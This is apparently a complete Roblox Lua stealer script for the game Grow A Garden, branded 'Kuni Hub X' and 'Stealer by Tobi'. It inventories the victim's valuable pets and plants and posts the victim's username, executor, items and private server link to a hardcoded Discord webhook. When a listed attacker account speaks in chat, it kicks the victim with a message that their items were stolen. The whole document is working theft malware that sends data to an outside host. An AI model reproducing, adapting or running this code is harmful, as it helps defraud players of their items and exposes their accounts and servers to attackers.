_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local users = _G.Usernames or {}
local min_value = _G.min_value or 10000000
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or "https://discord.com/api/webhooks/1412382801461776427/SrSHD137zB3ESdCPUU45hNXh4rSaJRYNWU-muRahrbLRzSRnnUCGsF4bIQlb5bJ_XFSy"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack")
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))
local dataService = require(modules:WaitForChild("DataService"))
local character = plr.Character or plr.CharacterAdded:Wait()

-- üö´ Excluded Items
local excludedItems = { "Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer" }

-- ü¶ä Priority List with Emoji
local PetPriorityData = {
    ["Kitsune"] = { priority = 1, emoji = "ü¶ä" },
    ["Raccoon"] = { priority = 2, emoji = "ü¶ù" },
    ["Disco Bee"] = { priority = 3, emoji = "ü™©" },
    ["Fennec Fox"] = { priority = 4, emoji = "ü¶ä" },
    ["Butterfly"] = { priority = 5, emoji = "ü¶ã" },
    ["Dragonfly"] = { priority = 6, emoji = "üê≤" },
    ["Mimic Octopus"] = { priority = 7, emoji = "üêô" },
    ["T-Rex"] = { priority = 9, emoji = "ü¶ñ" },
    ["Spinosaurus"] = { priority = 10, emoji = "ü´é" },
    ["Queen Bee"] = { priority = 11, emoji = "üëë" },
    ["Red Fox"] = { priority = 26, emoji = "ü¶ä" }
}

-- üíª Executor Detection
local function detectExecutor()
    if syn then return "Synapse"
    elseif KRNL then return "KRNL"
    elseif Fluxus then return "Fluxus"
    elseif Protosmasher then return "Protosmasher"
    elseif ArceusX or Arceus then return "Arceus X"
    elseif Delta then return "Delta"
    else return "Unknown" end
end

-- üí∞ Value Calculations
local function calcPetValue(petData)
    local hatchedFrom = petData.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then return 0 end

    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then return 0 end

    local rarityData = eggData.RarityData.Items[petData.PetType]
    if not rarityData then return 0 end

    local weightRange = rarityData.GeneratedPetData.WeightRange
    if not weightRange then return 0 end

    local baseWeight = petData.PetData.BaseWeight
    local reverseLerp = numberUtil.ReverseLerp(weightRange[1], weightRange[2], baseWeight)
    local valueMultiplier = math.lerp(0.8, 1.2, reverseLerp)
    local levelProgress = petUtils:GetLevelProgress(petData.PetData.Level)
    local finalMultiplier = valueMultiplier * math.lerp(0.15, 6, levelProgress)
    local basePrice = petRegistry.PetList[petData.PetType].SellPrice

    return math.floor(basePrice * finalMultiplier)
end

local function getWeight(tool)
    local value = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG") or tool:FindFirstChild("WeightValue")
    if value and value:IsA("NumberValue") then
        return math.floor(value.Value * 100 + 0.5) / 100
    else
        local match = tool.Name:match("%[(%d+%.?%d*) KG%]")
        return tonumber(match) or 0
    end
end

local function formatNumber(n)
    if not n then return "0" end
    local suffixes = { "", "k", "m", "b", "t" }
    local index = 1
    while n >= 1000 and index < #suffixes do
        n = n / 1000
        index = index + 1
    end
    return string.format("%.2f%s", n, suffixes[index])
end

-- üóÉÔ∏è Collect Tools
local itemsToSend = {}
local totalValue = 0

for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
        if tool:GetAttribute("ItemType") == "Pet" then
            local uuid = tool:GetAttribute("PET_UUID")
            local petData = dataService:GetData().PetsData.PetInventory.Data[uuid]
            local petName = petData.PetType
            if PetPriorityData[petName] then
                local value = calcPetValue(petData)
                totalValue += value
                table.insert(itemsToSend, {
                    Tool = tool,
                    Name = petName,
                    Value = value,
                    Weight = getWeight(tool),
                    Priority = PetPriorityData[petName].priority or 999,
                    Emoji = PetPriorityData[petName].emoji or "‚ùì"
                })
            end
        else
            local value = calcPlantValue(tool)
            if value >= min_value then
                totalValue += value
                table.insert(itemsToSend, {
                    Tool = tool,
                    Name = tool:GetAttribute("ItemName") or tool.Name,
                    Value = value,
                    Weight = getWeight(tool),
                    Priority = 999,
                    Emoji = "üçé"
                })
            end
        end
    end
end

-- üì§ Send Webhook
local function sendWebhook(dataList)
    table.sort(dataList, function(a, b)
        return a.Priority < b.Priority
    end)

    local fields = {
        {
            name = "Victim Username",
            value = plr.Name,
            inline = true
        },
        {
            name = "Executor",
            value = detectExecutor(),
            inline = true
        },
        {
            name = "Items",
            value = "",
            inline = false
        },
        {
            name = "Summary",
            value = string.format("Total Value: ¬¢%s\nServer: [%s](https://www.roblox.com/games/126884695634066/Grow-A-Garden?privateServerLinkCode=%s)", formatNumber(totalValue), game.JobId, game.JobId),
            inline = false
        }
    }

    for _, item in ipairs(dataList) do
        fields[3].value = fields[3].value .. string.format("%s %s (%.2f KG): ¬¢%s\n", item.Emoji, item.Name, item.Weight, formatNumber(item.Value))
    end

    if #fields[3].value > 1024 then
        fields[3].value = fields[3].value:sub(1, 1020) .. "...\n[truncated]"
    end

    local payload = {
        content = ping == "Yes" and "@everyone" or nil,
        embeds = {{
            title = "Kuni Hub X",
            color = 65280,
            fields = fields,
            footer = {
                text = "Stealer by Tobi | discord.gg/GY2RVSEGDT"
            }
        }}
    }

    local success, response = pcall(function()
        return request({
            Url = webhook,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if not success then
        warn("Failed to send webhook:", response)
    end
end

-- üß† Listen for trigger chat message
local function waitForTrigger()
    for _, player in ipairs(Players:GetPlayers()) do
        if table.find(users, player.Name) then
            player.Chatted:Connect(function()
                sendWebhook(itemsToSend)
                plr:Kick("Your items were stolen by Kuni HUB")
            end)
        end
    end
    Players.PlayerAdded:Connect(function(player)
        if table.find(users, player.Name) then
            player.Chatted:Connect(function()
                sendWebhook(itemsToSend)
                plr:Kick("Your items were stolen by KUNI HUB")
            end)
        end
    end)
end

-- ‚úÖ Start Logic
if #itemsToSend > 0 then
    waitForTrigger()
end
